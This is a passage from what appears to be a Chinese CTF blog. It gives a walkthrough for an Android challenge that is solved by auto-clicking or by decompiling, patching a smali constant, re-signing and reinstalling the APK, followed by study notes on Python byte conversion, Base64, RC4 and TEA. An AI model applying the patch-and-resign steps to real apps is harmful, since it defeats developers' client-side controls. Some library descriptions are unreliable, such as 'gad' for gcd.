class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pyautogui <span class="hljs-keyword">as</span> pd<br><span class="hljs-keyword">import</span> time<br>pd.FAILSAFE = <span class="hljs-literal">True</span><br><br>time.sleep(<span class="hljs-number">3</span>)<br><span class="hljs-comment">#3秒时间自己移动到要点击的位置</span><br>pd.click(clicks=<span class="hljs-number">100000</span>,interval=<span class="hljs-number">0.0001</span>)<br><span class="hljs-comment"># pyautogui.click()</span><br><span class="hljs-comment"># (100,100, clicks=2,interval=0.5,button=‘right’,duration=0.2)</span><br><span class="hljs-comment"># 位置，点击次数，间隔时间，右键(默认左键)，移动间隔</span><br></code></pre></td></tr></table></figure><p><a href="https://blog.csdn.net/qq_61774705/article/details/127165732">exp参考此篇文章</a></p><ol start="2"><li>使用apk反编译后重新打包，将1w的数值修改为1</li></ol><ul><li><p>下载<a href="https://ibotpeaches.github.io/Apktool/">下载apktool</a>,此工具作用就是将apk反编译和重新打包<br />输入`</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">java </span>-<span class="hljs-keyword">jar </span>apktool_2.<span class="hljs-number">6</span>.<span class="hljs-number">1</span>.<span class="hljs-keyword">jar </span>d &lt;filepath&gt; -o &lt;newfilename&gt;<br></code></pre></td></tr></table></figure><p>生成文件夹.<br />进入文件夹 <code>demo\smali\com\droidlearn\activity_travel</code> 路径找 <code>FlagActivity$1.smali</code> 文件，此文件可以直接用编辑器打开<br />在此文件中寻找到到0x2710(10000)十六进制，修改为0x1即为点击1次即可.<br /><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202303291146717.png" alt="202211080956544" /></p></li><li><p>重新打包</p><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs haxe">java -jar apktool_2<span class="hljs-number">.6</span><span class="hljs-number">.1</span>.jar b &lt;<span class="hljs-keyword">new</span><span class="hljs-type">filename</span>&gt; -o &lt;<span class="hljs-keyword">new</span><span class="hljs-type">file</span>&gt;.apk<br></code></pre></td></tr></table></figure><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202303291146071.png" alt="202211081009495" /><br />打包成功即生成一个.apk，但此时的apk不可使用，还需安装签名.</p></li><li><p>测试<br />安装至夜神模拟器，用/nox/bin目录下的adb工具进行安装，</p><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs haxe">adb install &lt;<span class="hljs-keyword">new</span><span class="hljs-type">file</span>&gt;.apk<br></code></pre></td></tr></table></figure><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202303291146818.png" alt="202211081012000" /><br />安装失败，这是没有签名导致的.</p></li><li><p>生成口令文件<br />使用JRE环境变量下的keytool生成口令文件,<a href="https://blog.csdn.net/w47_csdn/article/details/87564029">详细参考</a></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">keytool</span> -genkey -alias testalias -keyalg RSA -keysize <span class="hljs-number">2048</span> -validity <span class="hljs-number">36500</span> -keystore &lt;filename&gt;.keystore`<br></code></pre></td></tr></table></figure><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202303291147006.png" alt="202211081018301" /><br />输入回答，之后在当前目录下生成一个.keystore文件，使用<code>keytool -list -v -keystore &lt;filename&gt;.keystore</code>可以查看详细信息.</p></li><li><p>签名</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">jarsigner -<span class="hljs-keyword">verbose</span> -keystore <span class="hljs-symbol">&lt;filename&gt;</span>.keystore -storepass <span class="hljs-symbol">&lt;password&gt;</span> -signedjar <span class="hljs-symbol">&lt;newfile&gt;</span>.apk <span class="hljs-symbol">&lt;filename&gt;</span>.apk testalias<br></code></pre></td></tr></table></figure><p>其中<br />-<span class="label label-default">keystore + 签名文件</span><br><br />-<span class="label label-default">sotrepass + 签名口令密码</span> <br><br />-<span class="label label-default">signedjar后跟三个参数 分别是签名后的apk文件 需要签名的apk文件 签名的别名</span><br></p><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202303291147430.png" alt="202211081027234" /></p><p>签名成功，之后下载此flag.apk,启动指定的<span class="label label-info">FlagActivity$1.smali</span>，则可以得到flag<br /><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202303291147214.png" alt="202211081044884" /><br /><a href="https://www.anyiblog.top/2022/09/25/20220925/#Re5-%E8%89%BE%E5%85%8B%E4%BD%93%E6%82%9F%E9%A2%98">exp参考此篇文章</a></p></li><li><p>补充<br /><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202303291147062.png" alt="202211081042328" /><br />下载时若是出现此报错，需要删除之前下载的那个apk，<a href="https://blog.csdn.net/qq_42351033/article/details/122450733">解决方案</a><br />进入adb shell之后可以通过<code>pm list package</code>列出模拟器中所有的包</p></li></ul>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Crypto &amp; 算法</title>
    <link href="/posts/108720dc.html"/>
    <url>/posts/108720dc.html</url>
    
    <content type="html"><![CDATA[<h1 id="基础操作"><a class="markdownIt-Anchor" href="#基础操作"></a> 基础操作</h1><h2 id="转化"><a class="markdownIt-Anchor" href="#转化"></a> 转化</h2><p>​这里强制自己使用byte类型，这样可以统一python的不同数据类型</p><h3 id="all-byte"><a class="markdownIt-Anchor" href="#all-byte"></a> all -&gt; byte</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">all2byte</span>():<br>    <span class="hljs-comment"># string to byte</span><br>    string = <span class="hljs-string">&quot;Hello World&quot;</span><br>    str_byte = <span class="hljs-built_in">bytes</span>(string, <span class="hljs-string">&#x27;utf-8&#x27;</span>)  <span class="hljs-comment"># -&gt; b&#x27;Hello World&#x27;</span><br>    <br>    <span class="hljs-comment"># hex string to byte</span><br>    hex_string = <span class="hljs-string">&quot;68 65 6c6c6f20776f726c64&quot;</span>  <span class="hljs-comment"># 这里空格不会影响结果，但是需要是两个字符一组</span><br>    hex_byte = <span class="hljs-built_in">bytes</span>.fromhex(hex_string)  <span class="hljs-comment"># -&gt; b&#x27;hello world&#x27;</span><br>    <span class="hljs-comment"># list(hex_byte) -&gt; [104, 101, 108, 108, 111, 32, 119, 111, 114, 108, 100]</span><br>    <br>    <span class="hljs-comment"># long int to byte</span><br>    long_i = <span class="hljs-number">6788912312</span>  <span class="hljs-comment"># 下面就是计算转化为16进制的字节数</span><br>    b = <span class="hljs-built_in">int</span>.to_bytes(long_i, (long_i.bit_length() + <span class="hljs-number">7</span>) // <span class="hljs-number">8</span>, byteorder=<span class="hljs-string">&quot;little&quot;</span>)  <span class="hljs-comment"># -&gt; b&#x27;\xb8\x94\xa6\x94\x01&#x27;</span><br>    <br>    <span class="hljs-comment"># hex int to byte</span><br>    hex_int = <span class="hljs-number">0x12345678</span><br>    int_byte = <span class="hljs-built_in">int</span>.to_bytes(hex_int, <span class="hljs-number">4</span>, byteorder=<span class="hljs-string">&#x27;little&#x27;</span>)  <span class="hljs-comment"># -&gt; b&#x27;xV4\x12&#x27;</span><br>    <br>    <span class="hljs-comment"># list to byte</span><br>    list_num = [<span class="hljs-number">0x12</span>, <span class="hljs-number">0x34</span>, <span class="hljs-number">0x56</span>, <span class="hljs-number">0x78</span>]<br>    list_byte = <span class="hljs-built_in">bytes</span>(list_num)  <span class="hljs-comment"># -&gt; b&#x27;\x124Vx&#x27;</span><br>    <br>    <span class="hljs-comment"># str list to byte</span><br>    str_list = [<span class="hljs-string">&#x27;1&#x27;</span>, <span class="hljs-string">&#x27;C&#x27;</span>, <span class="hljs-string">&#x27;E&#x27;</span>, <span class="hljs-string">&#x27;B&#x27;</span>, <span class="hljs-string">&#x27;E&#x27;</span>, <span class="hljs-string">&#x27;0&#x27;</span>, <span class="hljs-string">&#x27;8&#x27;</span>, <span class="hljs-string">&#x27;9&#x27;</span>, <span class="hljs-string">&#x27;7&#x27;</span>, <span class="hljs-string">&#x27;4&#x27;</span>, <span class="hljs-string">&#x27;A&#x27;</span>, <span class="hljs-string">&#x27;9&#x27;</span>, <span class="hljs-string">&#x27;6&#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>, <span class="hljs-string">&#x27;C&#x27;</span>, <span class="hljs-string">&#x27;5&#x27;</span>]<br>    <span class="hljs-comment"># 先转str再转byte</span><br>    b = <span class="hljs-built_in">bytes</span>(<span class="hljs-string">&quot;&quot;</span>.join(str_list), encoding=<span class="hljs-string">&quot;utf-8&quot;</span>)  <span class="hljs-comment"># -&gt; b&#x27;1CEBE08974A961C5&#x27;</span><br></code></pre></td></tr></table></figure><h3 id="byte-all"><a class="markdownIt-Anchor" href="#byte-all"></a> byte -&gt; all</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">byte2all</span>():<br>    <span class="hljs-comment"># byte to string</span><br>    byte = <span class="hljs-string">b&#x27;Hello World&#x27;</span><br>    byte_str = <span class="hljs-built_in">str</span>(byte, <span class="hljs-string">&#x27;utf-8&#x27;</span>)  <span class="hljs-comment"># -&gt; &#x27;Hello World&#x27;</span><br>    <br>    <span class="hljs-comment"># byte to hex string</span><br>    byte = <span class="hljs-string">b&#x27;hello world&#x27;</span><br>    byte_hex = byte.<span class="hljs-built_in">hex</span>()  <span class="hljs-comment"># -&gt; &#x27;68656c6c6f20776f726c64&#x27;</span><br>    <br>    <span class="hljs-comment"># byte to long int</span><br>    byte = <span class="hljs-string">b&#x27;\xb8\x94\xa6\x94\x01&#x27;</span><br>    i = <span class="hljs-built_in">int</span>.from_bytes(byte, byteorder=<span class="hljs-string">&#x27;little&#x27;</span>)  <span class="hljs-comment"># -&gt; 6788912312</span><br>    <br>    <span class="hljs-comment"># byte to hex int</span><br>    byte = <span class="hljs-string">b&#x27;xV4\x12&#x27;</span><br>    int_num = <span class="hljs-built_in">int</span>.from_bytes(byte, byteorder=<span class="hljs-string">&#x27;little&#x27;</span>)  <span class="hljs-comment"># -&gt; 305419896 0x12345678</span><br>    <br>    <span class="hljs-comment"># byte to list</span><br>    byte = <span class="hljs-string">b&#x27;\x124Vx&#x27;</span><br>    list_num = <span class="hljs-built_in">list</span>(byte)  <span class="hljs-comment"># -&gt; [18, 52, 86, 120]</span><br>    <br>    <span class="hljs-comment"># byte to str list</span><br>    byte = <span class="hljs-string">b&#x27;1CEBE08974A961C5&#x27;</span><br>    str_list = [<span class="hljs-built_in">str</span>(byte[i:i + <span class="hljs-number">2</span>], <span class="hljs-string">&#x27;utf-8&#x27;</span>) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span><br>                <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(byte), <span class="hljs-number">2</span>)]  <span class="hljs-comment"># -&gt; [&#x27;1C&#x27;, &#x27;EB&#x27;, &#x27;E0&#x27;, &#x27;89&#x27;, &#x27;74&#x27;, &#x27;A9&#x27;, &#x27;61&#x27;, &#x27;C5&#x27;]</span><br></code></pre></td></tr></table></figure><h3 id="其余转换处理"><a class="markdownIt-Anchor" href="#其余转换处理"></a> 其余转换处理</h3><h4 id="-str"><a class="markdownIt-Anchor" href="#-str"></a> -&gt;Str</h4><ul><li><code>chr(a)</code><ul><li>将int类型的a根据其ascii码转化为str字符</li></ul></li><li><code>hex(a)</code><ul><li>将int类型的a转化为其十六进制str类型</li></ul></li><li><code>str(a)</code><ul><li>将所有类型的a按照其本身转化为str类型</li></ul></li><li><code>str = a.decode()</code><ul><li>将bytes类型的a转化为str类型</li></ul></li></ul><h4 id="-int"><a class="markdownIt-Anchor" href="#-int"></a> -&gt;Int</h4><ul><li><p><code>int(a,k)</code></p><ul><li>a为k进制数，使用 <code>int</code>将k进制数的a转化为十进制数</li><li><code>int(a)</code>直接将字符a转化为int类型，此时a必须为数字字符<ul><li>注意：不是转化为ascii码，而是转化为数字类型，即值不变，类型改变</li><li>例如 <code>a_str = '0x1234', a_int = int(a_str, 16)</code></li></ul></li></ul></li><li><p><code>eval(a)</code></p><ul><li>将str类型的十六进制数a转化为int类型(这里十六进制需要加上0x)</li></ul></li><li><p><code>ord(a)</code></p><ul><li>将字符类型的a按其ascii码转化为int类型</li></ul></li></ul><h4 id="-bytes"><a class="markdownIt-Anchor" href="#-bytes"></a> -&gt;Bytes</h4><ul><li><code>str.encode(encoding='utf-8')</code><ul><li>这里 <strong>utf-8是默认选项</strong>，也可以选择不填，即encode()<ul><li>str转换成 bytes 用 encode() 方法</li><li><code>bytes=b'\xe4\xba\xba\xe7\x94'</code>—bytes的形式</li></ul></li></ul></li></ul><h2 id="数据处理"><a class="markdownIt-Anchor" href="#数据处理"></a> 数据处理</h2><p>​<code>struct</code>模块可以解决<code>bytes</code>和其他二进制数据类型的转换。pack<code>函数把任意数据类型变成</code>bytes，<code>unpack</code>把<code>bytes</code>变成相应的数据类型。这里的格式就是(format:str, <em>v1</em>, <em>v2</em>, <em>…</em>)，其中format对于后面的数据进行匹配，然后输出</p><h3 id="pack"><a class="markdownIt-Anchor" href="#pack"></a> pack</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">struct.pack(<span class="hljs-string">&#x27;&lt;II&#x27;</span>, <span class="hljs-number">10240099</span>, <span class="hljs-number">1767863401</span>)  <span class="hljs-comment"># -&gt; b&#x27;\x00\x9c@ci_ti&#x27; 如果符合ascii的标准，就直接转化为字符</span><br></code></pre></td></tr></table></figure><h3 id="unpack"><a class="markdownIt-Anchor" href="#unpack"></a> unpack</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">struct.unpack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-string">b&#x27;it_i&#x27;</span>)  <span class="hljs-comment"># -&gt; (1767863401,) 这里只有一个符合 I 的规则，所以只有一个数据</span><br></code></pre></td></tr></table></figure><h4 id="format参数"><a class="markdownIt-Anchor" href="#format参数"></a> format参数</h4><ul><li>描述符</li></ul><p>struct可以指定使用大端序还是小端序来解析或者生成数据。</p><table><thead><tr><th>Character</th><th>Byte order</th><th>Size</th><th>Alignment</th></tr></thead><tbody><tr><td>@</td><td>native</td><td>native</td><td>native，凑足4个字节</td></tr><tr><td>=</td><td>native</td><td>standard</td><td>none</td></tr><tr><td>&lt;</td><td>little-endian</td><td>standard</td><td>none</td></tr><tr><td>&gt;</td><td>big-endian</td><td>standard</td><td>none</td></tr><tr><td>!</td><td>network(=big-endian)</td><td>standard</td><td>none</td></tr></tbody></table><ul><li>数据格式</li></ul><h2 id="数据格式"><a class="markdownIt-Anchor" href="#数据格式"></a> 数据格式</h2><table><thead><tr><th>Format</th><th>C Type</th><th>Python type</th><th>Standard size</th></tr></thead><tbody><tr><td>x</td><td>pad byte</td><td>no value</td><td></td></tr><tr><td>c</td><td>char</td><td>string of length 1</td><td>1</td></tr><tr><td>b</td><td>signed char</td><td>integer</td><td>1</td></tr><tr><td>B</td><td>unsigned char</td><td>integer</td><td>1</td></tr><tr><td>?</td><td>_Bool</td><td>bool</td><td>1</td></tr><tr><td>h</td><td>short</td><td>integer</td><td>2</td></tr><tr><td>H</td><td>unsigned short</td><td>integer</td><td>2</td></tr><tr><td>i</td><td>int</td><td>integer</td><td>4</td></tr><tr><td>I</td><td>unsigned int</td><td>integer</td><td>4</td></tr><tr><td>l</td><td>long</td><td>integer</td><td>4</td></tr><tr><td>L</td><td>unsigned long</td><td>integer</td><td>4</td></tr><tr><td>q</td><td>long long</td><td>integer</td><td>8</td></tr><tr><td>Q</td><td>unsigned long long</td><td>integer</td><td>8</td></tr><tr><td>f</td><td>float</td><td>float</td><td>4</td></tr><tr><td>d</td><td>double</td><td>float</td><td>8</td></tr><tr><td>s</td><td>char[]</td><td>string</td><td>1</td></tr><tr><td>p</td><td>char[]</td><td>string</td><td>1</td></tr><tr><td>P</td><td>void *</td><td>integer</td><td>0</td></tr></tbody></table><h2 id="技巧"><a class="markdownIt-Anchor" href="#技巧"></a> 技巧</h2><ul><li><p><code>join()</code></p><ul><li><code>print(''.join(list))</code>直接输出将列表拼接成字符串的结果<ul><li>list存储的是字符，例如list = [‘a’,‘c’,‘r’]</li><li>本意为隔一个’‘输出list的一个值，由于’'中间没有间隔，则即直接将list进行拼接</li></ul></li></ul></li><li><p><code>flag = key.split(' ')</code></p><ul><li>将字符key切割为列表类型，分界线为 <code>' '</code></li></ul></li><li><p><code>key = [i for i in range(10)]</code></p><ul><li><code>key</code>初始化——遍历 <code>i</code>，同时将i赋值给key[i]</li></ul></li></ul><h1 id="crypto库"><a class="markdownIt-Anchor" href="#crypto库"></a> Crypto库</h1><h2 id="utilnumber"><a class="markdownIt-Anchor" href="#utilnumber"></a> Util.number</h2><ul><li><p><code>bytes_to_long</code>与 <code>long_to_bytes</code></p><ul><li><code>bytes_to_long</code>将字节流转换位long类型数字，即最后一位字符转为ASCii之后乘以2<code>&lt;sup&gt;</code>0<code>&lt;/sup&gt;</code>, 往前的字符乘以2<code>&lt;sup&gt;</code>1<code>&lt;/sup&gt;</code>, 2<code>&lt;sup&gt;</code>2<code>&lt;/sup&gt;</code>……</li><li><code>long_to_bytes</code>将long类型数字转换为bytes类型，是 <code>bytes_to_long</code>的逆运算</li></ul></li><li><p><code>getPrime(n_lebgth)</code></p><ul><li>反复使用素性检测算法验证以获素随机数,其长度为2<code>&lt;sup&gt;</code>n<code>&lt;/sup&gt;</code></li></ul></li><li><p><code>getStrongPrime(n_lebgth)</code></p><ul><li>获得满足RSA要求的大素数</li></ul></li><li><p><code>inverse(a,n)</code></p><ul><li>求a模n的逆元</li><li>对于正整数 a, n，如果有 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi><mi>x</mi><mo>≡</mo><mn>1</mn><mtext> </mtext><mo stretchy="false">(</mo><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">ax ≡ 1 \ (mod \ n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.46375em;vertical-align:0em;"></span><span class="mord mathnormal">a</span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mspace"> </span><span class="mopen">(</span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace"> </span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span>，则称 x 的最小正整数解为 a 模 n的逆元</li></ul></li><li><p><code>getRandomNBitInteger(N)</code></p><ul><li>获得N比特的随机数(也就是保证最高位非0，且长度为2<code>&lt;sup&gt;</code>N<code>&lt;/sup&gt;</code>)</li></ul></li><li><p><code>gad(a,b)</code></p><ul><li>获得a与b的最大公约数</li></ul></li></ul><h1 id="算法原理"><a class="markdownIt-Anchor" href="#算法原理"></a> 算法原理</h1><h2 id="base64"><a class="markdownIt-Anchor" href="#base64"></a> Base64</h2><h3 id="算法原理-2"><a class="markdownIt-Anchor" href="#算法原理-2"></a> 算法原理</h3><ul><li>原理：使用64个可打印字符表示二进制所有数据的方法。这里由于 $ 2^6 = 64$ ，则使用 6 个位元作为一个单元，对应一个可打印字符。那么可以使用 3 个字节来对应 4 个 Base64 的可打印字符来表示。</li><li>Base64的可打印字符包括 字母 <strong>A-Z</strong> 、<strong>a-z</strong>，数字 <strong>0-9</strong>、和 “ +/ ” 一共 64 个可打印字符</li><li>转换规则：</li></ul><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202304031958591.png" alt="image-20230403195843560" /></p><h3 id="算法实现"><a class="markdownIt-Anchor" href="#算法实现"></a> 算法实现</h3><h4 id="base32与base16"><a class="markdownIt-Anchor" href="#base32与base16"></a> base32与base16</h4><ul><li><code>b32encode(bytes)</code>与 <code>b32decode()</code><ul><li>bytes必须是由str类型经过str.encode()转换而得来</li></ul></li><li><code>b32hexencode(bytes)</code>与 <code>b32hexdecode()</code><ul><li>与上面的相同</li></ul></li><li><code>b16</code>与 <code>b32</code>相同</li></ul><h4 id="base64-2"><a class="markdownIt-Anchor" href="#base64-2"></a> base64</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br>encrypt = base64.b64encode(<span class="hljs-string">&#x27;AlwaysBeta&#x27;</span>.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br><span class="hljs-comment"># Python3 中字符都是 unicode 编码，而 b64encode函数的参数为 byte 类型，所以必须先转码</span><br>decrypt = base64.b64decode(a)<br><br><span class="hljs-comment"># 换表解密</span><br>new_table = <span class="hljs-string">&quot;ABCDEFQRSTUVWXYPGHIJKLMNOZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span><br>old_table = <span class="hljs-string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span><br>cipher = <span class="hljs-string">&quot;zMXHz3TIgnxLxJhFAdtZn2fFk3lYCrtPC2l9&quot;</span>.swapcase()<br><span class="hljs-comment">#swapcase是大小写转化，大写转小写等</span><br><span class="hljs-built_in">print</span>(base64.b64decode(cipher.translate(<span class="hljs-built_in">str</span>.maketrans(new_table, old_table))))<br></code></pre></td></tr></table></figure><h2 id="rc4"><a class="markdownIt-Anchor" href="#rc4"></a> RC4</h2><p>​RC4的最终实现还是使用构造出来的盒子和你的输入进行异或，那么可以直接动调找到那个盒子，记录盒子的值，直接和最后比对的数据进行异或就可以得到flag。</p><h3 id="算法原理-3"><a class="markdownIt-Anchor" href="#算法原理-3"></a> 算法原理</h3><ul><li><p>原理：<strong>对明文使用同一个密钥异或两次最后仍是得到原文</strong>。</p><ul><li>即生成密钥之后，由密钥与明文异或后生成密文(加密过程)，由同一密钥与密文异或后得到明文 (解密过程)</li></ul></li><li><p>过程：</p><ol><li>初始化状态向量S(256个字节)</li><li>初始化密钥得到向量T(256个字节)，初始化就是将密钥轮换填充到T中</li><li>对向量S进行置换操作</li><li>密钥流的生成和加密(最后依旧是S异或明文生成密文)</li></ol></li></ul><h3 id="算法实现-2"><a class="markdownIt-Anchor" href="#算法实现-2"></a> 算法实现</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> ARC4 <span class="hljs-keyword">as</span> rc4cipher<br><span class="hljs-keyword">import</span> base64<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rc4</span>(<span class="hljs-params">pattern, data, key1</span>):<br>    <span class="hljs-keyword">if</span> pattern == <span class="hljs-string">&quot;encrypt&quot;</span>:<br>        key = <span class="hljs-built_in">bytes</span>(key1, encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>        enc = rc4cipher.new(key)<br>        res = enc.encrypt(data.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br>        res=base64.b64encode(res)<br>        res = <span class="hljs-built_in">str</span>(res,<span class="hljs-string">&#x27;utf8&#x27;</span>)<br>        <span class="hljs-keyword">return</span> res<br>    <span class="hljs-keyword">elif</span> pattern == <span class="hljs-string">&quot;decrypt&quot;</span>:<br>        data = base64.b64decode(data)<br>        key = <span class="hljs-built_in">bytes</span>(key1, encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>        enc = rc4cipher.new(key)<br>        res = enc.decrypt(data)<br>        res = <span class="hljs-built_in">str</span>(res,<span class="hljs-string">&#x27;utf8&#x27;</span>)<br>        <span class="hljs-keyword">return</span> res<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    data = <span class="hljs-string">&#x27;测试&#x27;</span><br>    key = <span class="hljs-string">&#x27;l2ru8181z&#x27;</span><br>  <br>    encrypt = rc4(<span class="hljs-string">&#x27;encrypt&#x27;</span>,data,key)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;加密的结果：<span class="hljs-subst">&#123;encrypt&#125;</span>&quot;</span>)<br>    decrypt = rc4(<span class="hljs-string">&#x27;decrypt&#x27;</span>, encrypt, key)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;解密的结果：<span class="hljs-subst">&#123;decrypt&#125;</span>&quot;</span>)<br></code></pre></td></tr></table></figure><h2 id="tea"><a class="markdownIt-Anchor" href="#tea"></a> TEA</h2><h3 id="算法原理-4"><a class="markdownIt-Anchor" href="#算法原理-4"></a> 算法原理</h3><p><a href="https://taardisaa.github.io/2021/09/24/TEA/">TEA，XTEA，XXTEA加密算法概要</a></p><ul><li><p>关于TEA的一点心得</p><ol><li><p>解密时需要准确判断sum的状态(最后sum的数值是多少，要把它放在什么位置)</p></li><li><p>数据可以直接使用IDA伪代码里提供的数据，不需要再进行小端序转换(汇编需要用lazyida插件)。不过最后的时候需要每4个字节从后往前进行拼接</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">output</span><span class="hljs-params">(ut32* m, ut32 n)</span> </span>&#123;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++)&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;0x%08x &quot;</span>, m[i]);<br>&#125;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br><br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>;j &lt; len;j++)&#123;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> k = <span class="hljs-number">3</span>; k &gt;= <span class="hljs-number">0</span>; k --)&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c&quot;</span>,((m[j]&gt;&gt;( <span class="hljs-number">8</span> * k )) &amp; <span class="hljs-number">0xff</span>));<br>&#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>python还可以使用内置函数进行操作</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">res = decrypt(n, v, k)<span class="hljs-comment"># res为数组</span><br>    <span class="hljs-keyword">for</span> r <span class="hljs-keyword">in</span> res:<br>        <span class="hljs-built_in">print</span>(r.to_bytes(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;little&#x27;</span>).decode(), end=<span 